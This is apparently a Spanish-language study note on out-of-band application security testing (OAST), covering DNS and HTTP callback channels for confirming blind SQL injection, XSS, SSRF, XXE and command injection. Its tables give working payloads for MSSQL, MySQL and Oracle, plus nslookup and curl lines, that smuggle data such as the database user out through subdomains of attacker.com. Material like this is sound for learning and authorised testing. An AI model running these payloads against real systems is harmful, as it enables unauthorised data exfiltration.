---
type: concepto
state: activa
priority: alta
created: 2026-08-18
updated: 2026-08-18
tags: [oast, blind, sqli, dns, ssrf, burp, owasp]
aliases: [Out-of-Band, Out-of-Band Application Security Testing]
---

# OAST (Out-of-Band Application Security Testing)

> [!info] OWASP Top 10:2025
> **A05:Injection / A10:SSRF** — OAST es la técnica de confirmación para vulnerabilidades ciegas (blind). Fuerza a la aplicación a realizar una conexión externa que el auditor puede verificar.

## Qué es

Metodología que detecta vulnerabilidades **forzando a la aplicación a realizar una conexión de red externa** hacia un servidor controlado por el evaluador. Si la conexión llega, la vulnerabilidad está confirmada sin dejar rastro en la respuesta HTTP original.

## Para qué sirve

- **Romper la ceguera:** Detecta fallos donde la app no muestra errores ni datos.
- **Confirmación 100%:** Si el servidor externo registra la conexión → vulnerabilidad real (cero falsos positivos).
- **Exfiltración de datos:** Permite extraer información a través de consultas DNS.

## Cómo funciona

```
Atacante → inyecta payload → App vulnerable → conexión externa → Servidor OAST
                                                (DNS/HTTP)        registra hit
```

## Canales de interacción

| Canal | Efectividad | Por qué |
|-------|-------------|---------|
| **DNS** | ⭐⭐⭐ | Casi ningún firewall corporativo bloquea DNS saliente |
| **HTTP/HTTPS** | ⭐⭐ | Útil para SSRF, pero más fácil de bloquear |
| **SMB/FTP/LDAP** | ⭐ | Dependiendo del entorno; menos común |

> [!tip] DNS es preferido
> Las consultas DNS son esenciales para producción → siempre se permiten.
> El atacante solo revisa los registros de su servidor DNS.

## Técnicas donde se usa OAST

| Técnica | Cómo se aplica OAST |
|---------|---------------------|
| **Blind SQLi** | `xp_dirtree` (MSSQL), `load_file` (MySQL), `EXTRACTVALUE` (Oracle) → resolución DNS |
| **Blind XSS** | Script en panel admin oculto → `http://attacker.com` → notifica al atacante |
| **SSRF** | Servidor vulnerable → petición HTTP a servidor OAST → confirma acceso a red |
| **XXE** | Entidad XML externa → conexión a servidor OAST → extrae archivos |
| **Command Injection** | `nslookup attacker.com` o `curl attacker.com` → confirma ejecución |
| **Supply Chain** | Paquete npm/PyPI malicioso → notificación DNS al instalarse |

## Sintaxis por motor de BD

| Motor | Payload OAST | Mecanismo |
|-------|-------------|-----------|
| **MSSQL** | `'; exec master..xp_dirtree '//'+@data+'.attacker.com/a'--` | Acceso a rutas de red ficticias → DNS |
| **MySQL** | `SELECT load_file(concat('\\\\', (SELECT user()), '.attacker.com\\x'))` | `load_file` → resolución UNC → DNS |
| **Oracle** | `SELECT EXTRACTVALUE(xmltype('<?xml...><!ENTITY % remote SYSTEM "http://'+(SELECT user)||'.attacker.com/"> %remote;]>'),'/l') FROM dual` | Entidad XML externa → HTTP/DNS |

> [!warning] Exfiltración por subdominio
> Los datos se codifican en el subdominio: `S3cure.attacker.com` → contraseña = `S3cure`.
> Revisar registros DNS del servidor atacante.

## Herramientas

| Herramienta | Tipo | Costo |
|-------------|------|-------|
| **Burp Suite Collaborator** | Servidor OAST integrado en Burp | Pro (trial gratis) |
| **Interactsh** | Servidor OAST open-source (OASTI) | Gratis |
| **Acunetix** | DAST con soporte OAST | Comercial |

## Referencia
- [[40 - RECURSOS/MOCs/MOC - Seguridad]]
- [[40 - RECURSOS/Conceptos/SQL-Injection]]
- [[40 - RECURSOS/Conceptos/Injection]]

#oast #blind #sqli #dns #ssrf #burp #owasp
